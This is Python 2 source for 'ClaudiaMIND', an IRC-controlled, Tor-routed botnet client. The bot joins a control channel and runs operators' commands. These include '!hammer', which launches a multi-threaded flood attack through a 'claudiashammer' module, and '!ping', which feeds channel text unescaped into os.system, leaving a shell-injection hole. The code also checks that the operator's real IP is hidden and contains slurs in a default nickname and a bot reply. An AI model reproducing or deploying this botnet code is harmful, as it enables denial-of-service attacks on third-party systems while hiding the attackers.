#!/usr/bin/env python2

from urllib2 import urlopen
import platform
import re
import claudiashammer
import argparse
import getpass
import socks
import socket
import ssl
import os
import sys
import time
import random
import threading
import string

try:
	import colorama
	winColors = True
except:
	winColors = False

def isWindows():
	return True if platform.system() == "Windows" else False

Windows = isWindows()

# Classes & Threading

class hammer(threading.Thread):
	def run(self):
		if (tor == True) and (torattack == True):
			claudiashammer.main(target, int(threads), int(port), False)
		elif (tor == True) and (torattack == False):
			fail("Unlucky, you will attack using Tor. (the entire script runs within Tor and I'm lazy to add this feature which is totally useless)")
			time.sleep(1)
			claudiashammer.main(target, int(threads), int(port), False)
		elif (tor == False) and (torattack == True):
			claudiashammer.main(target, int(threads), int(port), True)
		elif (tor == False) and (torattack == False):
			claudiashammer.main(target, int(threads), int(port), False)


# Notes

	"""
	Problem: Anyone can issue commands (by  abusing masters' 
	nicks), as the bots don't recognize operators.
	
	Solution: The bots don't really need to talk inside the 
	control channel, they can use private messages to talk to
	the masters only. Thus the solution is simply +m and 
	private messages instead of channel messages*.
			Simply: Bots don't use channel messages, but 
					private message the masters instead.
	* see (Ctrl+F) mark1
	"""

# Aesthetics

if not winColors:
	class bcolors:
		HEADER = '\033[95m' if not Windows else ''
		OKBLUE = '\033[94m' if not Windows else ''
		OKGREEN = '\033[92m' if not Windows else ''
		WARNING = '\033[93m' if not Windows else ''
		FAIL = '\033[91m' if not Windows else ''
		ENDC = '\033[0m' if not Windows else ''
		BOLD = '\033[1m' if not Windows else ''
		UNDERLINE = '\033[4m' if not Windows else ''
else:
	class bcolors:
		HEADER = '\033[95m'
		OKBLUE = '\033[94m'
		OKGREEN = '\033[92m'
		WARNING = '\033[93m'
		FAIL = '\033[91m'
		ENDC = '\033[0m'
		BOLD = '\033[1m'
		UNDERLINE = '\033[4m'

art = """
  ____ _                 _ _       __  __ ___ _   _ ____  
 / ___| | __ _ _   _  __| (_) __ _|  \/  |_ _| \ | |  _ \ 
| |   | |/ _` | | | |/ _` | |/ _` | |\/| || ||  \| | | | |
| |___| | (_| | |_| | (_| | | (_| | |  | || || |\  | |_| |
 \____|_|\__,_|\__,_|\__,_|_|\__,_|_|  |_|___|_| \_|____/ 
                                                          
                                  1337 Tor hivemind                       
"""

def okblue(msg):
	print(bcolors.OKBLUE + msg + bcolors.ENDC)

def okgreen(msg):
	print(bcolors.OKGREEN + msg + bcolors.ENDC)

def warning(msg):
	print(bcolors.WARNING + msg + bcolors.ENDC)

def fail(msg):
	print(bcolors.FAIL + msg + bcolors.ENDC)

global target
global threads
global port
global previous
target = None
threads = None
port = None

def get_previous():
	previous = {'target': target, 'threads': threads, 'port': port}
	return previous

previous = get_previous()

# Config

config = {}
execfile("configuration.conf", config)


# Configuration variables

ircd = config["ircd"]
ircport = config["ircport"]

minthreads = config["minthreads"]
maxthreads = config["maxthreads"]

tor = config["tor"]
torattack = config["torattack"]

ping = config["ping"]

channel = config["channel"]
password = ""

# Language

language = config["language"]
lang = {}
try:
	execfile("locales/" + language + ".lang", lang)
except Exception as e:
	fail("Incorrect language in configuration.conf!")
	print(e)

# Attack exceptions

attackconf = {}
execfile("attack_configuration.conf", attackconf)

accept_target = attackconf["accept_target"]

# Version

version = "0.2.5"

# Argparse

parser = argparse.ArgumentParser()
parser.add_argument("--port", "-p",
					help="SOCKS5 port")
parser.add_argument("--version", "-v",
					help="Display version",
					action="store_true")
args = parser.parse_args()

if args.version:
	okblue(lang["cmversion"] + version)
	sys.exit()

def stop(out):
	get_previous()
	claudiashammer.stop_now = True
	if out == 1:
		message("Stopping the attack")
	target = None
	threads = None
	port = None

okblue(art)
time.sleep(1)

print(bcolors.HEADER + "~~ Built up on TorBot. Special thanks to Leet for this awesome code which is so easy to work with. <33333" + bcolors.ENDC)
okblue("v" + version + " see: https://github.com/ClaudiaDAnon/ClaudiaMIND")

if Windows:
	socksport = args.port if args.port else raw_input(lang["socksport"] + " (" + lang["defscport"] + str(9150) + "): ");
else:
	socksport = args.port if args.port else raw_input(lang["socksport"] + " (" + lang["defscport"] + str(9050) + "): ")

if socksport == "":
	socksport = 9150 if Windows else 9050
else:
	socksport = int(socksport)


native_ip = config["native_ip"]

def getip():
	ip = str(urlopen("https://api.ipify.org").read()).strip("\r").strip("\n")
	return ip

if native_ip == "0":
	warning(lang["unativeip"])
	time.sleep(2)
	native_ip = getip()

print(lang["ynativeip"] + native_ip)

if not Windows:
	print("Username: " + getpass.getuser())
	if getpass.getuser() != "root":
		fail("Not root")
	else:
		okgreen("Root!")

# Tor

if (tor == True) and (torattack == True):
	okgreen("You're using the default Tor configuration.")
	time.sleep(1)

elif (tor == False) and (torattack == False):
	fail("You're not using Tor at all.")
	time.sleep(1)

if tor == True:
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", socksport, True)
	socket.socket = socks.socksocket
else:
	warning("You're joining the IRC without Tor.")
	time.sleep(1)
s = socks.socksocket()

IP = getip()

if IP == native_ip:
	IP = 0
	fail(lang["yoipleaks"])
	sys.exit()
else:
	okgreen(lang["noipleaks"])
	time.sleep(1)

okblue("IP: " + str(IP))

# Setting nicknames and realnames

nickname = config["nickname"] # SET THIS VALUE TO YOUR NICKNAME
if nickname ==  "":
	nickname = "faggot" + str(int(random.random() * 1000))
else:
	nickname = nickname + str(int(random.random() * 1000))
print(lang["bettrname"] + bcolors.FAIL + nickname + bcolors.ENDC + lang["setinfile"])

username = nickname
realname = nickname

try:
	s.connect((ircd, ircport))
	s = ssl.wrap_socket(s)
	
except Exception as e:
	fail(lang["confailed"] + "[" + str(socksport) + "]")
	print(e)
	exit()

#s.send("PASS " + password + "\r\n")    
s.send("NICK " + nickname + "\r\n")
s.send("USER " + username + " 0 * :" + realname + "\r\n")


# Message-sending
def message(msg):
	#s.send("PRIVMSG " + channel + " :" + msg + "\r\n")
	# mark1
	privmessage(auth, msg)
	if msg == "Stopping the attack":
		print(bcolors.OKGREEN + nickname+" ("+lang["senderyou"]+"): " + bcolors.ENDC + lang["stopattck"])
	elif "is up for me." in msg:
		print(bcolors.OKGREEN + nickname+" ("+lang["senderyou"]+"): " + bcolors.ENDC + lang["isupforme"])
	elif "is down for me." in msg:
		print(bcolors.OKGREEN + nickname+" ("+lang["senderyou"]+"): " + bcolors.ENDC + lang["isdownfme"])
	elif "Going with minimum threads" in msg:
		print(bcolors.OKGREEN + nickname+" ("+lang["senderyou"]+"): " + bcolors.ENDC + lang["minthread"])
	elif "Going with maximum threads" in msg:
		print(bcolors.OKGREEN + nickname+" ("+lang["senderyou"]+"): " + bcolors.ENDC + lang["maxthread"])
	else:
		print(bcolors.OKGREEN + nickname+" ("+lang["senderyou"]+"): " + bcolors.ENDC + msg)

# Private-Messaging
def privmessage(user2, msg):
	s.send(":source PRIVMSG " + user2 + " :" + msg + "\r\n")
	#print(bcolors.OKGREEN + nickname+" ("+lang["senderyou"]+") --> " + user2 + ": " + bcolors.ENDC + msg)

# Wait for ping from server

connected = 0
while connected == 0:
	recvd = s.recv(4096)
	if "PING :" in recvd:
		recvd = recvd.strip("PING :")
		#print "DEBUG: " + recvd
		pong = "PONG :" + recvd
		s.send(pong)
	
	if nickname + "!" + username in recvd:
		connected = 1

# Message the authorities and join channel

#s.send(":source PRIVMSG nickserv :IDENTIFY "+ password + "\r\n")
s.send(":source JOIN :" + channel + "\r\n")
#s.send(":source PRIVMSG " + channel + " :Ahoy, pirate ~" + nickname + "~ has joined the battle.\r\n")

# Loop to receive input and execute commands        

# def take_input(chan, s):
#     while 1:
#         data = raw_input()
#         message(data)
		
# q = Queue()

# thread.start_new_thread(take_input, (channel,s,))

free_for_all = 0 # Freemode off, only authorized people can issue commands
allowed = 0
	
while 1:
	recvd = s.recv(1024)
	msg = string.split(recvd)[3:]
	sentmessage = " ".join(msg)[1:]
	
	#userfinding 
	recvdfix = recvd.strip("\r\n")
	senderuser = recvdfix.split(" ")
	senderuser = senderuser[0].split("!")
	senderuser = senderuser[0].strip(":")
	
	#print "recvd: " + recvd
	#print "<%r> %r" % (senderuser, sentmessage)
	if "PING :" in recvd:
		recvd = recvd.strip("PING :")
		pong = "PONG : " + recvd
		s.send(pong) 
	else:
		destination = string.split(recvd)[2:][0]


	
	#check for commands only authorized people can give

	if (destination == channel) or (sentmessage[:13] == "claudiamind :"):

		if sentmessage[:13] == "claudiamind :":
			sentmessage = sentmessage.replace("claudiamind :", "")

		if nickname in sentmessage:
			print bcolors.OKGREEN + "<" + senderuser + "> " + sentmessage + bcolors.ENDC 
		else:
			print bcolors.OKBLUE + "<" + senderuser + "> " + bcolors.ENDC + sentmessage 
		
		auth = senderuser
		allowed = 1

		# execute any commands detected from authorised people
		
		if allowed == 1:
			if sentmessage == "!test":
				message(getip() + " @" + version)
			if sentmessage[:7] == "!hammer":
				if target is None:
					attackdata = sentmessage.replace("!hammer ", "")
					try:
						attackspecs = attackdata.split()
						if len(attackspecs) == 3:
							target, threads, port = attackspecs
							if accept_target(target):
								time.sleep(2)
								threads = int(threads)
								if threads < maxthreads:
									if threads < minthreads:
										threads = minthreads
										message("Going with minimum threads (" + str(threads) + ")")
								else:
									threads = maxthreads
									message("Going with maximum threads (" + str(threads) + ")")
								port = int(port)
								attack_hammer = hammer()
								hammer.start(attack_hammer)
							else:
								message("Denied.")
					except Exception as e:
						fail(lang["incorrect"] + "!hammer" + lang["incformat"])
						message("Incorrect !hammer format.")
						print(e)
			if "!command" in sentmessage:
				if sentmessage[:8] == "!command":
					try:
						commanddata = sentmessage.replace("!command ", "")
						result = commanddata.split()
						if result[0] == nickname or result[0] == "*":
							s.send(result[1] + "\r\n")
					except Exception as e:
						fail(lang["incorrect"] + "!command" + lang["incformat"])
						message("Incorrect !command format.")
						print(e)
						stop(0)
			if "!ping" in sentmessage:
				if sentmessage[:5] == "!ping":
					if ping == True:
						pingdata = sentmessage.replace("!ping ", "")
						try:
							response = os.system("ping -c 1 " + pingdata)
							if response == 0:
								message(pingdata + " is up for me.")
							else:
								message(pingdata + " is down for me.")
						except Exception as e:
							fail(lang["incorrect"] + "!ping" + lang["incformat"])
							message("Incorrect !ping format.")
							print(e)
			if sentmessage == "!stop":
				stop(1)
			if ("ACTION pets "+nickname in sentmessage) or ("ACTION pets *" in sentmessage):
				message("purr")
			if sentmessage == "!reload":
				if sentmessage[:7] == "!reload":
					if Windows:
						message("I'm a Microfag!")
					else:
						if (socksport == 9050):
							if getpass.getuser() != "root":
								message("Not root")
							else:
								os.system("service tor reload")
								message("Reloading ...")
						else:
							message("Not running :9050")
			if sentmessage == "Ahoy!":
				message("Ohai " + auth + "!")
			if sentmessage == "Ahoy " + nickname + "!":
				message("Ohai " + auth + "!")
			if sentmessage == "!version":
				message(version)
			if sentmessage == "!stats":
				if previous["threads"] is not None:
					message("s:" + previous["threads"])
			if sentmessage == "!allstats":
				if previous["threads"] is not None:
					message("as:" + previous["target"] + ":" + previous["threads"] + ":" + previous["port"])
	else:
		if nickname in sentmessage:
			print bcolors.OKGREEN + "<" + senderuser + " --> %s> "%lang['senderyou'] + sentmessage + bcolors.ENDC
		else:
			print bcolors.OKBLUE + "<" + senderuser + " --> %s> "%lang['senderyou'] + sentmessage + bcolors.ENDC
